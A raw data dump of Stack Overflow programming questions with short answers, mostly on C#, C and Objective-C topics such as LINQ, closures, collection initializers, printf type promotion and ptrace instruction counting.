","33708","","<p>I don't have specific real world examples in mind but the ""authority"" is the C standard. If something is not required by the standard, you can build a conforming implementation that intentionally fails to comply with any other assumptions. Some of these assumption are true most of the time just because it's convenient to implement a pointer as an integer representing a memory address that can be directly fetched by the processor but this is just a consequent of ""convenience"" and can't be held as a universal truth.</p>

<ol>
<li>Not required by the standard (<a href=""http://stackoverflow.com/questions/1241205/are-all-data-pointers-of-the-same-size-in-one-platform"">see this question</a>). For instance, <code>sizeof(int*)</code> can be unequal to <code>size(double*)</code>. <code>void*</code> is guaranteed to be able to store any pointer value.</li>
<li>Not required by the standard. By definition, size is a part of representation. If the size can be different, the representation can be different too.</li>
<li>Not necessarily. In fact, ""the bit length of an architecture"" is a vague statement. What is a 64-bit processor, really? Is it the address bus? Size of registers? Data bus? What?</li>
<li>It doesn't make sense to ""multiply"" or ""divide"" a pointer. It's forbidden by the compiler but you can of course multiply or divide the underlying representation (which doesn't really make sense to me) and that results in undefined behavior.</li>
<li>Maybe I don't understand your point but <strong>everything</strong> in a digital computer is just some kind of binary number.</li>
<li>Yes; kind of. It's guaranteed to point to a location that's a <code>sizeof(pointer_type)</code> farther. It's not necessarily equivalent to arithmetic addition of a number (i.e. <em>farther</em> is a logical concept here. The actual representation is architecture specific)</li>
</ol>
"
"<p>I'm a brand-newbie to C#, albeit not programming, so please forgive me if I mix things up a bit -- it's entirely unintentional.  I've written a fairly simple class called ""API"" that has several public properties (accessors/mutators).  I've also written a testing console application that uses reflection to get an alphabetically list of names &amp; types of each property in the class:</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using MyNamespace;		// Contains the API class

namespace ConsoleApplication1
{
	class Program
	{
		static void Main(string[] args)
		{
			Console.WriteLine(""Hi"");

			API api = new API(1234567890, ""ABCDEFGHI"");
			Type type = api.GetType();
			PropertyInfo[] props = type.GetProperties(BindingFlags.Public);

			// Sort properties alphabetically by name.
			Array.Sort(props, delegate(PropertyInfo p1, PropertyInfo p2) { 
				return p1.Name.CompareTo(p2.Name); 
			});

			// Display a list of property names and types.
			foreach (PropertyInfo propertyInfo in type.GetProperties())
			{
				Console.WriteLine(""{0} [type = {1}]"", propertyInfo.Name, propertyInfo.PropertyType);
			}
		}
	}
}
</code></pre>

<p>Now what I need is a method that loops through the properties and concats all the values together into a querystring.  The problem is that I'd like to make this a function of the API class itself (if possible).  I'm wondering if static constructors have something to do with solving this problem, but I've only been working with C# for a few days, and haven't been able to figure it out.</p>

<p>Any suggestions, ideas and/or code samples would be greatly appreciated!</p>
","33708","","<p>This is unrelated to <code>static</code> constructors. You can do it with <a href=""http://msdn.microsoft.com/en-us/library/79b3xss3%28VS.80%29.aspx"" rel=""nofollow""><code>static</code> methods</a>:</p>

<pre><code>class API {
    public static void PrintAPI() {
       Type type = typeof(API); // You don't need to create any instances.
       // rest of the code goes here.
    }
}
</code></pre>

<p>You can call it with:</p>

<pre><code>API.PrintAPI();
</code></pre>

<p>You don't use any instances when you call <code>static</code> methods.</p>

<p><strong>Update:</strong> To cache the result, you can either do it on first call or in an <code>static</code> initializer:</p>

<pre><code>class API {
    private static List&lt;string&gt; apiCache;
    static API() {
        // fill `apiCache` with reflection stuff.
    }

    public static void PrintAPI() {
        // just print stuff from `apiCache`.
    } 
}
</code></pre>
"
"<p>In c#, is there a way of updating a variable (without using lock) where multiple threads can read the value, but the thread that updates the variable is not considered important.</p>

<p>What I mean is, if a thread updates that value but the other threads don't get that updated value a few minutes later then that is OK.</p>

<p>Is there such a way?</p>

<p>Many thanks</p>
","33708","","<p>If the updated value is not important to other threads, why the variable is shared between the threads at all? Every thread can use its own copy.</p>

<p>It isn't clear to me. Do you want to intentionally make the delay for reading values or you mean it doesn't matter if other threads can't immediately see the updated value?</p>

<p>In any case, if you want to atomically update a variable without a lock, you should consider using <a href=""http://msdn.microsoft.com/en-us/library/system.threading.interlocked.aspx"" rel=""nofollow"">Interlocked</a> methods but I'm not really sure if this is what you need.</p>
"
"<p>If you have a C function which returns an integer, you could write a statement like this:</p>

<pre><code>MyInt &amp;= MyFunc();
</code></pre>

<p>...where we're using the bitwise-AND assignment operator.</p>

<p>The question is: is MyFunc() guaranteed to be executed, even if MyInt equals zero?</p>

<p>Likwise, if we used the bitwise-OR assignment operator (|=), would MyFunc() always be executed, even if MyInt were set to all ones?</p>

<p>Put another way: is lazy evaluation permitted in C for bitwise operators?</p>
","33708","","<p>No. Bitwise operators are not short-circuited. <code>MyFunc()</code> execution is guaranteed regardless of the value of <code>MyInt</code>.</p>
"
"<p>I'm trying to convert an NSString to a single char.  When I write <code>[[NSLocale] currentLocale] objectForKey:NSLocaleDecimalSeparator]</code>, I get <code>@"",""</code>.  How can I convert this to <code>','</code>?</p>

<p>Thank you!</p>
","33708","","<pre><code>unichar character = [myNSString characterAtIndex:0];
</code></pre>
"
"<p>I want to parse a string like <code>""3.5""</code> to a double. However, </p>

<pre><code>double.Parse(""3.5"") 
</code></pre>

<p>yields 35 and </p>

<pre><code>double.Parse(""3.5"", System.Globalization.NumberStyles.AllowDecimalPoint) 
</code></pre>

<p>throws a <code>FormatException</code>.</p>

<p>Now my computer's locale is set to German, wherein a comma is used as decimal separator. It might have to do something with that and <code>double.Parse()</code> expecting <code>""3,5""</code> as input, but I'm not sure.</p>

<p>How can I parse a string containing a decimal number that may or may not be formatted as specified in my current locale?</p>
","33708","","<pre><code>double.Parse(""3.5"", CultureInfo.InvariantCulture)
</code></pre>
"
"<p>I want to start a new thread using a C function, not an objective-C method. I tried</p>

<pre><code>[NSThread detachNewThreadSelector: @selector(func) toTarget: nil withObject: id(data)];
</code></pre>

<p>where I have</p>

<pre><code>void func(void *data) {
   // ...
}
</code></pre>

<p>and <code>data</code> is a <code>void *</code>, but I get a runtime crash in <code>objc_msgSend</code>, called from</p>

<pre><code>-[NSThread initWithTarget:selector:object:]
</code></pre>

<p>What can I do instead? Is it even possible?</p>
","33708","","<p>Create an Objective-C class with a method that simply calls that function. Take the selector of that method and pass it to <code>NSThread</code> API.</p>
"
"<p>I am using Linq and the Entity Framework.  I have a Page Entity, that has a many-to-many relationship to a Tag Entity.</p>

<p>I want to create a Linq query that pulls all pages that match all of the supplied Tags (in the form of a Int64[]).</p>

<p>I have tried various WhereIn, and BuildContainsExpression examples, but none are working as expected.</p>

<p>I am now trying to loop through each of the Tags and build a list of expressions:</p>

<pre><code> foreach (Int64 item in Tags)
 {
    Expression&lt;Func&lt;Pages, bool&gt;&gt; tagFilter = c =&gt; c.Tags.Any(x =&gt; x.TagID == item);
    exp.Add(tagFilter);
 }
</code></pre>

<p>However, I think the local variable ""item"" is messing with the query because it either is using one tag, or none of them when the query runs, however if I specify them like this:</p>

<pre><code> Expression&lt;Func&lt;Pages, bool&gt;&gt; tagFilter1 = c1 =&gt; c1.Tags.Any(x =&gt; x.TagID == 70);
 exp.Add(tagFilter1);
 Expression&lt;Func&lt;Pages, bool&gt;&gt; tagFilter2 = c1 =&gt; c1.Tags.Any(x =&gt; x.TagID == 130);
 exp.Add(tagFilter2);
 Expression&lt;Func&lt;Pages, bool&gt;&gt; tagFilter3 = c1 =&gt; c1.Tags.Any(x =&gt; x.TagID == 77);
 exp.Add(tagFilter3);
</code></pre>

<p>Using the actual number ""70"" for example, it works like a charm.  I am basically storing the expressions in a list and using LinqKit to And() them.</p>

<p>Is there a way to keep this dynamic?</p>
","33708","","<p>Change your code to:</p>

<pre><code>foreach (Int64 item in Tags)
{
    var temp = item; // this variable is scoped **inside** the loop.
    Expression&lt;Func&lt;Pages, bool&gt;&gt; tagFilter = c =&gt; c.Tags.Any(x =&gt; x.TagID == temp);
    exp.Add(tagFilter);
}
</code></pre>

<p>For a detailed explanation, <a href=""http://stackoverflow.com/questions/1095707/what-is-the-exact-definition-of-a-closure/1095770#1095770"">read my answer to the ""What is the exact definition of a closure?"" question</a>.</p>
"
"<p>I have an enumerated type that I would like to define the >, &lt;, >=, and &lt;= operators for.  I know that these operators are implictly created on the basis of the enumerated type (as per the <a href=""http://msdn.microsoft.com/en-us/library/aa664726%28VS.71%29.aspx"">documentation</a>) but I would like to explictly define these operators (for clarity, for control, to know how to do it, etc...)</p>

<p>I was hoping I could do something like:</p>

<pre><code>public enum SizeType
{
    Small = 0,
    Medium = 1,
    Large = 2,
    ExtraLarge = 3
}

public SizeType operator &gt;(SizeType x, SizeType y)
{

}
</code></pre>

<p>But this doesn't seem to work (""unexpected toke"") ... is this possible?  It seems like it should be since there are implictly defined operators.  Any suggestions?</p>
","33708","","<p>You can't do that. You can only provide overloaded operators for classes and structs you define -- and at least one of the parameters should be of type of the class or struct itself. That is, you <em>can</em> declare an overloaded addition operator that adds a <code>MyClass</code> to <code>MyEnum</code> but you can never do that with two <code>MyEnum</code> values.</p>
"
"<p>I have extended my entities to implement specific interfaces for its type. I am trying to perform the following query:</p>

<pre><code> var results = from x in context.MyEntityTable
               where x.AProperty == AValue
               select x;

 return results.Count() &gt; 0 ? results.Cast&lt;IApplicationEntity&gt;().ToList() : null;
</code></pre>

<p>However, I keep getting the following error:</p>

<p><b>""LINQ to Entities only supports casting Entity Data Model primitive types""</b></p>

<p>Basically what I want to do is always convert the results from the raw entity type to a generic list of the interface it implements.</p>

<p>Is this possible?</p>
","33708","","<p>You can do the cast on the client, bypassing the entity framework query translation layer by calling <a href=""http://msdn.microsoft.com/en-us/library/bb335435.aspx"" rel=""nofollow""><code>AsEnumerable</code></a> extension method:</p>

<pre><code>return results.Any()
       ? results.AsEnumerable().Cast&lt;IApplicationEntity&gt;().ToList() 
       : null;
</code></pre>

<p>However, it's better to reverse the order of doing the <code>Count</code> check:</p>

<pre><code>var list = results.AsEnumerable().Cast&lt;IApplicationEntity&gt;().ToList();
return list.Count == 0 ? null : list;
</code></pre>
"
"<p>I have a question concerning a generic type parameter.</p>

<p>Let's say I have the following definitions in my domain model:</p>

<pre><code>abstract class Entity&lt;TId&gt;
{
    public TId Id { get; private set; }
    /* ... */
}

class Person : Entity&lt;long&gt;
{
    public string Name { get; set; }
    /* ... */
}
</code></pre>

<p>Let's say now I want to create a method to view details of a person:</p>

<pre><code>public void Details(long? id)
{
    if (!id.HasValue) {
        Error(...);
        return;
    }
    var person = PersonRepository.Get(id.Value);
    ShowPersonDetail(person);
}
</code></pre>

<p>Let's go further and say that <strong>PersonRepository</strong> is an specialization of <strong>Repository</strong>, so that its ""Get"" method is ""automagically"" implemented, to accept the correct strong-typed id argument (in this case, a <code>long</code> argument).</p>

<p><hr /></p>

<p>Now let's say one day I decide that <strong>Person's Ids should be Guids</strong>. What I want is to be able to change this ONLY in my Person class, and it will change everywhere else automatically. If I do so, in the code I have right now, the PersonRepository.Get() method won't need to be edited, but my Details() method will have to be changed.</p>

<p>I was looking for something like:</p>

<pre><code>Details(Person.IdType id) { /*...*/ }
</code></pre>

<p>Oh, by the way, this ""Details"" method will be located in another assembly, if this might change anything...</p>

<p>but strongly-typed and it must accept either value types or reference types.</p>

<p>Any ideas?</p>

<p>Thanks!</p>
","33708","","<p>I'm not exactly sure if this is what you want. You can have the method take a <code>Func&lt;Person,T&gt;</code> and have it infer the types for you:</p>

<pre><code>public T Get&lt;T&gt;(Func&lt;Person,T&gt; property) {
    return property(myPerson);
}
</code></pre>

<p>and call it with:</p>

<pre><code>var id = PersonRepository.Get(p =&gt; p.Id);
</code></pre>

<p>The compiler is able to infer type of <code>T</code> from the lambda expression.</p>
"
"<p>I want to be able to call a method that creates an object and sets properties of the object based on the parameters passed into the method.  The number of parameters is arbitrary, but the catch is I don't want to use strings.  I want to use the actual properties sort of like you do in lambda expressions.</p>

<p>I want to be able to call the method with something that might look like this:</p>

<pre><code>controller.Create&lt;Person&gt;(f=&gt;{f.Name = 'John', f.Age = 30})
</code></pre>

<p>or something along those lines where I use the actual property reference (f.Name) instead of a string representation of the property.</p>

<p>Another stipulation is that I don't want any work to be done before the method call.  I'm writing this in a library, so I don't want the user to have to do anything except make the call and get back an object with the properties set to the values passed in.</p>
","33708","","<p>You can do something like:</p>

<pre><code>controller.Create&lt;Person&gt;(f =&gt; { f.Name = 'John'; f.Age = 30; })
</code></pre>

<p>The create method signature will be:</p>

<pre><code>public T Create&lt;T&gt;(Action&lt;T&gt; propertySetter) where T : class {
    T value = ...;
    propertySetter(value);
    return value;
}
</code></pre>

<p><code>where T : class</code> is not strictly required here but if <code>T</code> is a value type, the modifications to its properties would be lost.</p>
"
"<p>I am going out of my skull trying to figure this out. I have a Windows Form app in C# and am trying to figure out where I would implement the CLI app equivalent of the primary while loop in main(). Everywhere I have looked I have found absolutely nothing that will help me. I am using Visual C#'s gui designer. Please help, as this is the only thing preventing me from moving on in my project and again, everywhere I have looked has left me dry.</p>

<p>EDIT: Problem solved with an instance of Timer.</p>
","33708","","<p>It's inside the <a href=""http://msdn.microsoft.com/en-us/library/ms157902.aspx"" rel=""nofollow""><code>Application.Run</code></a> method. You shouldn't call <code>GetMessage</code> API function directly:</p>

<pre><code>// MyForm is derived from `System.Windows.Forms.Form` class
Application.Run(new MyForm());
</code></pre>
"
"<p>Why can't you use a ref or out parameter in a lambda expression?</p>

<p>I came across the error today and found a workaround but I was still curious why this is a compile-time error.</p>

<p>Here's a simple example:</p>

<pre><code>    private void Foo()
    {
        int value;
        Bar(out value);
    }

    private void Bar(out int value)
    {
        value = 3;
        int[] array = {1, 2, 3, 4, 5};
        int newValue = array.Where(a =&gt; a == value).First();
    }
</code></pre>
","33708","","<p>Under the hood, the anonymous method is implemented by hoisting <strong>captured variables</strong> (which is what your question body is all about) and storing them as fields of a compiler generated class. There is no way to store a <code>ref</code> or <code>out</code> parameter as a field. Eric Lippert discussed it in <a href=""http://blogs.msdn.com/ericlippert/archive/2009/05/04/the-stack-is-an-implementation-detail-part-two.aspx"">a blog entry</a>. Note that there is a difference between captured variables and lambda parameters. You <strong>can</strong> have ""formal parameters"" like the following as they are not captured variables:</p>

<pre><code>delegate void TestDelegate (out int x);
static void Main(string[] args)
{
    TestDelegate testDel = (out int x) =&gt; { x = 10; };
    int p;
    testDel(out p);
    Console.WriteLine(p);
}
</code></pre>
"
"<p>Is there builtin method that would do this or do I always have to manually create a new array and then fill it up with a foreach loop</p>
","33708","","<pre><code>list.ToArray()
</code></pre>
"
"<p>What is a best approach to make a function or set of statements thread safe in C#?</p>
","33708","","<p>Don't use shared read/write state when possible. Go with immutable types.</p>
"
"<p>on a Linux machine, I am using ptrace with the PTRACE_SINGLESTEP parameter to count the number of machine instructions of a program. I followed this article: <a href=""http://www.ncsu.edu/it/mirror/ldp/LDP/LGNET/81/sandeep.html"" rel=""nofollow"">http://www.ncsu.edu/it/mirror/ldp/LDP/LGNET/81/sandeep.html</a>.</p>

<p>However, the result seems odd to me. For a very simple program, over 95000 machine instructions are counted. The test program is</p>

<pre><code>int main(void) { return 23; }
</code></pre>

<p>What's going on here? Is the code from the article wrong? (I can't see what's wrong with it.)
 If not, what causes such a simple program to require >95000 instructions?</p>
","33708","","<p>The C program you're compiling is linked to C library. It contains the <code>_start</code> symbol which the program execution starts from. At that point, C library initializes itself and eventually calls <code>main</code>. After <code>main</code> returns, the control flows back to <code>_start</code> and there are a bunch of other instructions to execute and return the program return value. Note that using <code>PTRACE_SINGLESTEP</code> successively doesn't count the number of compiled instructions. It counts the number of <strong>executed instructions</strong>. That means 95k instructions are executed before entering <code>main</code>, when executing <code>main</code> and after exiting <code>main</code>. </p>
"
"<p>Is there any time in which a reference type is more efficient than a value type ? Why ? Can you give an example ? </p>
","33708","","<p>The question is too broad to have a definite answer. An example case can be where you have a 10k object and are passing it to a recursive function. If you use a value type, every time you call a method, you'll be copying the whole thing.</p>
"
"<p>I have this function:</p>

<pre><code>    public bool IsValidProduct(int productTypeId)
    {
        bool isValid = false;

        if (productTypeId == 10 ||
            productTypeId == 11 ||
            productTypeId == 12)
        {
            isValid = true;
        }

        return isValid;
    }
</code></pre>

<p>but I'm wondering if there's an easier way to write it, such as:</p>

<pre><code>    public bool IsValidProduct(int productTypeId)
    {
        bool isValid = false;

        if (productTypeId.In(10,11,12))
        {
            isValid = true;
        }

        return isValid;
    }
</code></pre>

<p>I know I could write an extension method to handle this, I'm just curious if there's already something out there or if there's a better way to write it.</p>
","33708","","<pre><code>new [] {10, 11, 12}.Contains(productTypeId)
</code></pre>
"
"<p>The way I currently do it in mysql is is </p>

<pre><code>UPDATE table SET hits=hits+1 WHERE id = 1;
</code></pre>

<p>This keeps live stats on the site, but as I understand, isnt the best way to go about doing this. </p>

<p><strong>Edit:</strong></p>

<p>let me clarify... this is for counting hits on specific item pages. I have a listing of movies, and I want to count how many views each movie page has gotten. After it +1s, it adds the movie ID to a session var, which stories the ids of all the pages the user viewed. If the ID of the page is in that array, it wont +1 it. </p>
","33708","","<p>If your traffic is high enough, you shouldn't hit the database on every request. Try keeping the count in memory and sync the database on a schedule (for example, update the database on every 1000 requests or every minute.)</p>
"
"<p>As a follow up question to my <a href=""http://stackoverflow.com/questions/1375314/simple-generation-of-guid-in-c"">last one</a>, is there any simple way to tell if a given C library is installed on a given machine (not programattically, just as a once off sort of thing)?  I need to use libuuid, but I'm not sure if it's installed on the machines in question.  The only two ways I can think of are:</p>

<p>1) Try to compile the code there (more work than I'd like to do)</p>

<p>2) Try something like ""man libuuid"" although seems like this wouldn't always be reliable if for some reason the manpages didn't get installed.</p>

<p>Is there some better other way?</p>
","33708","","<p>Have you considered using <a href=""http://www.gnu.org/software/autoconf/manual/html%5Fnode/index.html"" rel=""nofollow""><code>autoconf</code></a>? It's designed to check and see whether the build environment is set up correctly.</p>
"
"<p>I have this file</p>

<pre><code>var paragraph = ""Abandon| give up or over| yield| surrender| leave| cede| let go| deliver| turn over| relinquish|  depart from| leave| desert| quit| go away from| desert| forsake| jilt| walk out on |  give up| renounce| discontinue| forgo| drop| desist| abstain from|  


recklessness| intemperance| wantonness| lack of restraint| unrestraint|  


abandoned |left alone| forlorn| forsaken| deserted| neglected| rejected| shunned| cast off | jilted| dropped| "";
</code></pre>

<p>with a lot of spacing, so it's giving me that error at the spacings. </p>

<p>then running a loop and alerting the output</p>

<pre><code>var sentences = paragraph.split(""|"");
var newparagraph = """";

for (i = 0; i &lt; sentences.length; i++) {
    var words = sentences[i].split("" "");
    if (words.length &lt; 4) {
        newparagraph += sentences[i] + ""|"";
    }
}
alert(newparagraph);
</code></pre>

<p>how do I read from a file that doesn't get errors from spacing?</p>
","33708","","<p>I can't see a quote character at the end of <code>var paragraph = ""...</code> line.</p>
"
"<p>I need help with a specific LINQ query (I still suck at em'!)</p>

<p>Background Info:</p>

<p>I've got a class DataEntry:</p>

<pre><code>class DataEntry{
    public Attribute Attribute{get; set;}
    public List&lt;object&gt; Data{get; set;}
</code></pre>

<p>Attribute Class:</p>

<pre><code>class Attribute{
    public string FeatureName{get; set;}
    public Types FeatureType{get; set;}
    public List&lt;object&gt; PossibleValues{get; set;}
</code></pre>

<p>What i'll eventually have is about ~20 different data entries with about 1000 data objects per entry. What I'm trying to do is write a LINQ query to select a specific data entry based on the FeatureType and then give me a count of the total number of data items of that entry equal to a specific value.</p>

<p>What i'm trying to get is the count of the ""high"" and count of the ""low"" values from the data entry that has a featuretype equal to ""foobar"".</p>

<p>The closest I've gotten is:</p>

<pre><code>int count = dataset.SelectMany(i =&gt; i.Data).Count(j =&gt; j.ToString() == ""high"");
</code></pre>

<p>Which gives me the count of ""high"", but doesn't filter by featuretype.</p>

<p>Is it possible? Is it possible to do in a single statement?</p>
","33708","","<p>You are on the right track. Just add a <code>Where</code> method to filter out stuff before feeding them to <code>SelectMany</code>.</p>

<pre><code>dataset.Where(i =&gt; i.Attribute.FeatureType == Types.FooBar)
       .SelectMany(i =&gt; i.Data)
       .Count(j =&gt; j.ToString() == ""high"")
</code></pre>

<p>To calculate high and low in a single statement, you can try:</p>

<pre><code>dataset.Where(i =&gt; i.Attribute.FeatureType == Types.FooBar)
       .SelectMany(i =&gt; i.Data)
       .Select(i =&gt; i.ToString())
       .Aggregate(new { High = 0, Low = 0 },
            (acc, i) =&gt; val == ""high"" ? new { High = i.High + 1, i.Low }
                      : val == ""low""  ? new { i.High,  Low = i.Low + 1 } : acc);
</code></pre>
"
"<p>My brain farts a lot when it comes to hex. Some people are abidextrous and others are just plain right handed... well, kind of like that, I'm VERY base10 I guess.</p>

<p>Anyway... I'm trying to make some firmware more efficient.  We have a function that's calculating a vehicle's speed based on some hex data it gets via the CANBUS.  Right now I'm converting it to a float so I can wrap my head around it but I'm wondering if we'd use less ROM space if we left it in integer format?  Can that be done without losing accuracy?  Right now my floats are accurate to 1/16th of a kph.  I know this function seems simple, but running hundreds of times per second it is bogging it down a little.</p>

<p>First, here is some sample data:</p>

<p>[06] [3c] ...
[06] [3a] ...
[06] [3b] ...
[06] [46] ...
[06] [3b] ...</p>

<p>I've left off the other 6 bytes as they don't relate to speed.  The byte on the left we'll call speed_a and the byte on the right is speed_b.  Here is the function to convert:</p>

<pre><code>float calculateSpeed()
{
    float speed;
    speed = ( ( float )speed_a * 256.0 + speed_b ) / 16.0;
    return speed;
}
</code></pre>

<p>So the data above would translate to:</p>

<p>99.7500
 99.6250
 99.6875
100.3750
 99.6875</p>

<p>and that does accurately reflect the true speed of the vehicle in kph.  For our application though, we don't really care what the true speed is because everything is relative. As long as we don't lose resolution we're happy.  I thought about just keeping everything in INT form, but then when you divide by 16 it just truncates.</p>

<p>I'm not an idiot about most things... but I'm an idiot with base2.</p>

<p>Lil' help?  Thanks.</p>
","33708","","<p>Simply don't divide by 16.0. You can still compare, sort, add or subtract speeds.</p>
"
"<p>I cannot figure out how to convert this code from C# to VB.net. It says - Argument not specified for parameter âyâ in the calling code below.</p>

<p>Any suggestions?</p>

<p>Thanks</p>

<p><hr /></p>

<p>Calling CODE:</p>

<pre><code>list.Sort(Utility.CompareContactListsBySortOrder) - error here in VB
</code></pre>

<p>CODE:</p>

<pre><code>    /// &lt;summary&gt;
    /// Defines the compare criteria for two Contact List instances
    /// &lt;/summary&gt;
    /// &lt;param name=""x""&gt;Contact List to be compared&lt;/param&gt;
    /// &lt;param name=""y""&gt;Contact List to be compared&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    public static int CompareContactListsBySortOrder(ContactList x, ContactList y)
    {
        if (x.SortOrder.HasValue &amp;&amp; y.SortOrder.HasValue)
        {
            return x.SortOrder.Value.CompareTo(y.SortOrder.Value);
        }

        return 0;
    }
</code></pre>

<p><hr /></p>

<pre><code>''' &lt;summary&gt;
''' Defines the compare criteria for two Contact List instances
''' &lt;/summary&gt;
''' &lt;param name=""x""&gt;Contact List to be compared&lt;/param&gt;
''' &lt;param name=""y""&gt;Contact List to be compared&lt;/param&gt;
''' &lt;returns&gt;&lt;/returns&gt;
Public Shared Function CompareContactListsBySortOrder(ByVal x As ContactList, ByVal y As ContactList) As Integer
    If x.SortOrder.HasValue AndAlso y.SortOrder.HasValue Then
        Return x.SortOrder.Value.CompareTo(y.SortOrder.Value)
    End If

    Return 0
End Function

Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
    target = value
    Return value
End Function
</code></pre>
","33708","","<pre><code>list.Sort(AddressOf Utility.CompareContactListsBySortOrder)
</code></pre>

<p>In VB, you use the <code>AddressOf</code> operator to take the address of method to create a delegate. In C#, you just specify the method name.</p>
"
"<p>How many bytes of data does a typical HTTP get request consume.
For instance if I request a page from the server through a browser how many bytes of data would be sent?</p>
","33708","","<p>Use <a href=""http://www.fiddler2.com/fiddler2/"" rel=""nofollow"">Fiddler</a> to intercept the request and see for yourself.</p>
"
"<p>in C# 3, initializers were added.  This is a great feature.  However, one thing has me confused.</p>

<p>When you initialize class, you typically have to specify the member variable or property you are initializing.  For example:</p>

<pre><code>class C { public int i; }

public void blah() {
    C c = new C() { i = 1 };
}
</code></pre>

<p>Array semantics have been in C# since the beginning, i think.  But they don't behave like that.  For example</p>

<pre><code>public void foo()
{
    int[] i = new int[] { 0, 1, 2, 3 };
}
</code></pre>

<p>All fine and good, but what about classes with array semantics?</p>

<pre><code>public void bar()
{
    List&lt;int&gt; li = new List&lt;int&gt;() { 0, 1, 3, 3 };
}
</code></pre>

<p>List is just a class, like any other (though it is a generic).  </p>

<p>I'm trying to figure out how the compiler initializes the List member.  Is this some kind of magic done behind the scenes?  Or is this something related to there being an indexer defined on the class?  </p>

<p>Thanks.</p>
","33708","","<blockquote>
  <h3>C# Language Specification v3.0 Section 7.5.10.3 Collection Initializers:</h3>
  
  <p>The collection object to which a collection initializer is applied must be of a type that implements <code>System.Collections.IEnumerable</code> or a compile-time error occurs. For each specified element in order, the collection initializer invokes an <code>Add</code> method on the target object with the expression list of the element initializer as argument list, applying normal overload resolution for each invocation. Thus, the collection object must contain an applicable <code>Add</code> method for each element initializer.</p>
</blockquote>

<p>To enable this feature for your own collections, you just need to have an <code>Add</code> method with appropriate parameters. The compiler will transform it to a sequence of calls to the <code>Add</code> method with the arguments you specified.</p>
"
"<p>I need to declare 3d array variable but can't.</p>

<pre><code>int[][][]  ary = new int[5][2][];
ary[0,0] = new int[20];
ary[0,1] = new int[3];
</code></pre>

<p>Could you please help me!</p>

<p>Thanks in advance
Hamid</p>
","33708","","<pre><code>int[,][] ary = new int[5,2][];
</code></pre>

<p>declares a 2D array of <code>int[]</code> objects and initializes it. Use</p>

<pre><code>ary[0, 0] = new int[10];
ary[0, 0][0] = 42;
</code></pre>

<p>to access elements.</p>

<p>Note that in C#, multidimensional arrays are different from arrays of arrays. That is, <code>int[][][]</code> is a single dimensional array of single dimensional arrays of single dimensional arrays of integers while <code>int[,,]</code> is a three dimensional array of integers.</p>
"
"<p>This is the touchesBegan method for a view that has multiple touches enabled.</p>

<pre><code>- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {
    UITouch* touch = [touches anyObject];
    if ([touches count] &gt; 1)
        NSLog(@""multi touches: %d fingers"", [touches count]);

    NSUInteger numTaps = [touch tapCount];

    if (numTaps == 1) {
        NSLog(@""single tap"");
    } else {
        NSLog(@""multi tap: %d"", numTaps);
    }
}
</code></pre>

<p>I never seem to log a multi-touch.  Just single and double taps.  Am I wrong to have assumed it was as easy as getting the count for touches?</p>
","33708","","<p>You should set <code>multipleTouchEnabled</code> property to <code>YES</code> on the view to let it send you multiple number of <code>UITouch</code> objects.</p>

<p>Beside that, only <code>UITouch</code> objects that changed are passed. If you touch some location and don't move your finger and after that, touch another location, only the new touch object will be passed. You should query <code>UIEvent</code> object for all active touches in the view:</p>

<pre><code>[event touchesForView:self]
</code></pre>
"
"<p>Note: I'm relatively new to Objective-C and am coming from Java and PHP.</p>

<p>Could someone explain to me why I always have to first allocate and then initialize an instance?</p>

<p>Couldn't this be done in the init methods like this:</p>

<pre><code>+ (MyClass*)init {
    MyClass *instance = [MyClass alloc];
    [instance setFoo:@""bla""];

    return instance;
}

+ (MyClass*)initWithString:(NSString*)text {
    MyClass *instance = [MyClass init];
    [instance setFoo:text];

    return instance;
}
...
</code></pre>

<p>Is this just a relict from the old C days or is there something that I'm not seeing?</p>

<p>I know this isn't a problem as I could as well always call alloc and init, but since it's a bit tedious I'd like to at least know why I'm doing it.</p>

<p>I'm liking the expressiveness of the language so far, but this is something that I want to fully understand in order to think the Objective-C way.</p>

<p>Thank you!</p>
","33708","","<p>You don't have to. You can use <code>[MyClass new]</code>. This is similar to your hypothetical <code>init</code> method.</p>

<p>Basically, Objective-C, which didn't have garbage collection initially, separates the concept of memory allocation and class initialization. That's why there are two distinct methods. When you call <code>alloc</code>, you are explicitly allocating memory.</p>
"
"<p>Take the following :</p>

<pre><code>#include &lt;stdio.h&gt;

main() {
    unsigned long long verybig = 285212672;

    printf(""Without variable : %llu\n"", 285212672);
    printf(""With variable    : %llu"", verybig);
}
</code></pre>

<p>This is the output of the above program : </p>

<pre><code>Without variable : 18035667472744448
With variable    : 285212672
</code></pre>

<p><hr /></p>

<p>As you can see from the above, when <code>printf</code> is passed the number as a constant, it prints some huge incorrect number, but when the value is first stored in a variable, <code>printf</code> prints the correct number.</p>

<p>What is the reasoning behind this?</p>
","33708","","<p><code>285212672</code> is an <code>int</code> value. <code>printf</code> expects an <code>unsigned long long</code> and you're passing it an <code>int</code>. Consequently, it'll take more bytes off the stack than you passed a real value and prints garbage. When you put it in an <code>unsigned long long</code> variable before passing it to the function, it'll be promoted to <code>unsigned long long</code> in the assignment line and you pass that value to <code>printf</code> which works correctly.</p>
"
"<p>This is what I've come up with so far, but it doesn't seem very optimal, any ideas on better approaches?</p>

<pre><code>public void ToBytes(object[] data, byte[] buffer)
{
    byte[] obytes;
    int offset = 0;

    foreach (object obj in data)
    {
        if (obj is string)
            obytes = System.Text.Encoding.UTF8.GetBytes(((string)obj));
        else if (obj is bool)
            obytes = BitConverter.GetBytes((bool)obj);
        else if (obj is char)
            obytes = BitConverter.GetBytes((char)obj);
        // And so on for each valuetype

        Buffer.BlockCopy(obytes, 0, buffer, offset, obytes.Length);
        offset += obytes.Length;
    }
}
</code></pre>
","33708","","<p>Probably, you should consider using <code>BinaryFormatter</code> instead:</p>

<pre><code>var formatter = new BinaryFormatter();
var stream = new MemoryStream();
formatter.Serialize(stream, obj);
byte[] result = stream.ToArray();
</code></pre>

<p>Beside that, there are some pretty good serialization frameworks like <a href=""http://code.google.com/p/protobuf-net/"" rel=""nofollow"">Google Protocol Buffers</a> if you want to avoid reinventing the wheel.</p>
"
"<p>Consider the following nested type:</p>

<pre><code> public class Book
 {

    private class Chapter
    {

    }

 }
</code></pre>

<p>As the chapter type is controlled by Book, is it a means of composition or is it a bad assumption to think composition here?</p>

<p>I am not sure, so to understand this I raised the question.</p>
